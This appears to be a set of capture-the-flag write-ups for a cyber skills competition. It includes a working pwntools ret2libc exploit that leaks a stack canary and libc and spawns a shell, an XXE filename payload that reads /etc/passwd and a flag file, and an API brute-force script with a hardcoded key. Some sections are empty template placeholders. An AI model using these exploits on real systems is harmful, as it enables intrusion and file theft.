# CSA_S1_2024
# CTF Writeups
## Writeups for the ADF Cyber Skills Association Season 1 challenges.

### Title of challenge here
Description - xxxxxxxxxxxxxxxxxxxxxxxxxxx
```
place any code here
```
Solution:
Plugged this straight into ChatGPT:
```
More code here for solution
```
:+1: FLAG{ENTER_FLAG_HERE}
<hr>

### Two up
Description - Let's play some two-up! Flag format:
FLAG{0x.de-adbeef_cafe}

netcat to the remote server on port 1337 (from nmap scan)

Solution:
Found a great tutorial on youtube that went through canary's and NX.
(https://www.youtube.com/watch?v=XaWlKYgmEDs)
Referring to the code from CryptoCat, modified to produce the following.
In stages, running against the remote server, you can leak the libc address
which then allows you to narrow down the libc version running remotely using 
blukat (https://libc.blukat.me/)

After trying several libraries, it turned out to be libc6-amd64_2.31-13+deb11u7_i386.so
Downloaded that locally, renamed to libc.so.6 and ran the code again and got the shell

Overall there's 3 stages:
S1 - leak the Canary
S2 - leak libc
S3 - ret2libc for shell

Once shell is gained, cd to /, and cat flag.txt

Brickwalls:
It's tricky getting the code to send the payload at the right prompt of Bet: so that
has to be accurate in code for execution.
```
from pwn import *
import sys

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './twoup'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

def breakpoint_handler(signal, frame):
    print("Breakpoint reached")
    # You can add additional actions here if needed
    pass

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 15  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

pop_rdi = 0x004013fb  # Found with ropper
ret = 0x00401016  # Found with ropper

# Send payload 1
log.info(f'Sending payload 1')
io.sendlineafter(b'Bet:', b'%9$p')
sleep(0.5)
# Canary value
reply1 = io.recvuntil(b'Your bet:')
print("Reply 1 is: ",reply1)
leaked_addresses = io.recvlineS().split("\n")[0]
print("Leaked addresses: ",leaked_addresses)
canary = int(leaked_addresses, 16)
log.info(f'Canary: {hex(canary)}')

# Build payload 2 (leak printf)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Leak got.puts
    pop_rdi,
    elf.got.printf,
    elf.plt.printf,
    0x00401319
])
# Send payload 2
io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:', payload)
sleep(0.5)
io.recvuntil(b'You lose')
io.recvline()
# Retrieve got.printf address
got_printf = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info(f"leaked got_printf: {got_printf:#x}")
libc.address = got_printf - libc.symbols.printf
info(f"libc_base: {libc.address:#x}")

# Build payload 3 (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret, # Stack alignment
    libc.symbols.system
])

# Send payload 3
io.recvline()
#io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:',payload)

# Get our flag/shell
io.interactive()

```
:+1: FLAG{w3.w1ll-r3m3mb3r_th3m}

### Unknown Entity
Description - We've written a nice, highly secure tool that parses EXIF data! 
Flag Format: FLAG{th1s-1s_y0ur.fl4g}

Solution:
Initial when the site is visited, it presents an option to upload a file. It turns out it's restricted to *.jpg images and tricks used to bypass filetypes will not work on this.
When an image is uploaded, there's the option to download XML and view it. Upon doing this, provided EXIF data is present, somthing similar to the following is presented.
```
<!--  EXIF data for Capture.JPG  -->
<EXIF>
<ExifOffset>344</ExifOffset>
<Artist>Bob Dylan</Artist>
<XPAuthor>b'B\x00o\x00b\x00 \x00D\x00y\x00l\x00a\x00n'</XPAuthor>
<SubsecTimeOriginal>77</SubsecTimeOriginal>
<SubsecTimeDigitized>77</SubsecTimeDigitized>
<DateTimeOriginal>2024:02:10 09:08:50</DateTimeOriginal>
<DateTimeDigitized>2024:02:10 09:08:50</DateTimeDigitized>
</EXIF>
```
The interesting piece here is the inclusion of a html comment.
```
<!--  EXIF data for Capture.JPG  -->
</EXIF>
```
This can be exploited using an XXE vulneraibilty by crafting a special name for a jpg image, modifying an XML tag using exiftool, then uploading it.
Firstly, I modified the exif data of an image and changed the Copyright tag to &xxe; which then is used by the XXE exploit to return the sought after 
value.
```
exiftool -Copyright='&xxe;' image.jpg
```
Once that was done, I change the jpg filename to the exploit then uploaded it
I tested it on /etc/passwd firstly using (note the use of url encoding)
```
--><!DOCTYPE%20root%20[%20<!ENTITY%20xxe%20SYSTEM%20"file:%2f%2f%2fetc&2fpasswd"%20>%20]><!--
```
Which returned the file contents
```
Copyright: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```
After a couple of guesses at where the flag might be, it was just located in the root location (/)
```
--><!DOCTYPE%20root%20[%20<!ENTITY%20xxe%20SYSTEM%20"file:%2f%2f%2fflag.txt"%20>%20]><!--.jpg
```
It then returned the flag.

:+1: FLAG{th3.truth-15_out.th3r3}
<hr>

### Walk the dog
Description - We were hoping to move our new API to production, however it keeps failing tests! There’s a test file, and we try and submit it but it doesn’t work, we just 
can’t get it to pass. We fired the guy that wrote the API a year ago. Can you help us? The veterinarians really need this API to get the data they need on new dog breeds faster. 
Flag Format: FLAG{this_is_your_flag}
```
place any code here
```
Solution:
For this one, I found the api located at hxxp://x.x.x.x:9988/api-test and put together a script to enumerate possible values for each of the expected in the json content listed below
```
{
  "name": "value",
  "temperament": "value",
  "lifespan": "value",
  "weightKg": "value",
  "weightLbs": "value",
  "heightCm": "value",
  "heightInches": "value"
}
```
I also created a number of text files that literally just contained data that correlated to the specific json field. 
This is was script used:
```
import requests
import json

# Define the base URL and API key
base_url = 'http://10.107.0.4:9988/api-test'     # adjust for correct IP
api_key = '9d207bf0-10f5-4d8f-a479-22ff5aeff8d1' # api key from provided source code

# Define the file paths for variable replacement
files = {
    'name': 'name.txt',
    'temperament': 'temperament.txt',
    'lifespan': 'lifespan.txt',
    'weightKg': 'weightKg.txt',
    'weightLbs': 'weightLbs.txt',
    'heightCm': 'heightCm.txt',
    'heightInches': 'heightInches.txt'
}

# Read the initial values from each input file
file_values = {}
for key, value in files.items():
    with open(value, 'r') as var_file:
        file_values[key] = var_file.readlines()

# Define headers for the multipart request
headers = {
    'accept': 'application/json',
    'x-api-key': api_key,
}

# Loop through the lines of the files
for i in range(len(file_values['name'])):
    json_string = {}
    # Build the JSON string with placeholders
    for key, value in file_values.items():
        if i < len(value):  # Check if index i is within the range of the list
            json_string[key] = value[i].strip()
        else:
            json_string[key] = "FINISHED"

    # Write the JSON string to test.json
    with open(f'test_{i}.json', 'w') as file:
        json.dump(json_string, file)

    # Read the content of the test.json file
    with open(f'test_{i}.json', 'r') as file:
        json_content = file.read()

    # Define files for the multipart request
    files = {
        'file': (f'test_{i}.json', open(f'test_{i}.json', 'rb'), 'application/json'),
    }

    # Send the POST request
    response = requests.post(base_url, headers=headers, files=files)

    # Print messages with different colors
    if "Test Unsuccessful. Partial Match:" in response.text:
        print("\033[91mTest Unsuccessful. Partial Match detected.\033[0m")  # Red color
    elif "Test Successful! The API is ready for production." in response.text:
        print("\033[92mTest Successful! The API is ready for production.\033[0m")  # Green color
    else:
        print("\033[93mResponse: No match found for the provided JSON.\033[0m")  # Yellow color

    # Print JSON content
    print(f"JSON Content: {json_content}, Response: {response.text}")
```
And when run, it just iterated though each field adding row by row the data from the source files. At this point, all I hoped for was a positive hit
any any field to return the response "Test Unsuccessful. Partial Match detected" meaning I could start to narrow down each value in order to identify
at least four correct repsonses (as per the source code provided - snippet below)
```
if xx >= 4:
        return "Test Successful! The API is ready for production. " + flagz
    elif matched_item:
        return "Test Unsuccessful. Partial Match: " + matched_item["name"]
    else:
        raise HTTPException(
            status_code=404,
            detail="No match found for the provided JSON.",
```
Maybe there was a glitch in the server source however all it took was one correct field in order to return the flag (in this case it was a height match of 25)

:+1: FLAG{hawt_diggety_dawg}
<hr>

### Whisker Worries
Description - Someone has compromised our web app! Investigate the logs to find the flag! 
Flag Format: FLAG{f0UnD_FlaG}
```
place any code here
```
Solution:
Plugged this straight into ChatGPT:
```
More code here for solution
```
:+1: FLAG{ENTER_FLAG_HERE}
<hr>

### Wobbly Proxy
Description - Only the admin user can view the flag at /admin. What is wrong with this config? location /config {alias /etc/nginx/conf.d/; } Maybe try get a closer
look at the configuration file. 
Flag Format: FLAG{F0und_Fl4g}
```
place any code here
```
Solution:
Plugged this straight into ChatGPT:
```
More code here for solution
```
:+1: FLAG{ENTER_FLAG_HERE}
<hr>
<hr>
